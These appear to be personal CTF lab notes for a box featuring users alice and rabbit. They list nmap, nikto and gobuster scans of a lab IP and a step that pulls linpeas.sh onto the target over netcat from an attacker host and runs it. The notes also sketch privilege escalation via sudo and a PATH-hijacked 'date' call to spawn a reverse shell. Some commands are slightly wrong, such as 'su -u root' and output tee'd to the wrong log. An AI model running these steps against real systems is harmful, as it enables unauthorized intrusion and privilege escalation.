
## `NMAP`
Search for services that are running
```
mkdir nmap
nmap -sC -sV -oN nmap/initial 10.10.202.184
```

## `nikto`
TODO
```
nikto -h "http://10.10.202.184" | tee nikto.log
```

## `gobuster`
Used for search for files that we can access on a webserver
```
gobuster dir -u "http://10.10.202.184" -w /opt/directory-list-2.3-medium.txt | tee nikto.log
```

## `linpeas.sh`
Search for vulnerable/priv escalation processes on a target
```
[local] upload_file_nc.sh /opt/linpeas.sh
[remote] nc 10.2.2.132 24591 > /dev/shm/linpeas.sh
[remote] chmod +x linpeas.sh
[remote] ./linpeas.sh
```

**Note that linpeas usually trips on `/etc/sudoers.d`** This dir is used to give users special permissions. Look for setuid vulns here.
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/somescript.py
```

```
[remote] cd /home/rabbit
```

Copy the `teaParty` binary local
run strings
echo $PATH
The `date` program doesn't use an absolute path!
Use this to launch a reverse shell
Group id is still incorrect
password.txt exists
```
su -u root
```

